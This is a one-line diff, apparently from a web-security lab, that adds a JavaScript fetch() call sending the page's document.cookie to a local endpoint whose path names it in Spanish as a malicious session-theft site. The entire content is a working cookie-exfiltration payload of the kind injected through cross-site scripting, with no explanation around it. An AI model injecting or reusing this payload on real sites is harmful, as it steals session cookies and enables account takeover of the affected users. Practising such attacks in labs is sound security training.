@@ -1,0 +1,1 @@
+fetch(`http://localhost:8080/sitio-malvado/robo-session?cookies=${document.cookie}`)
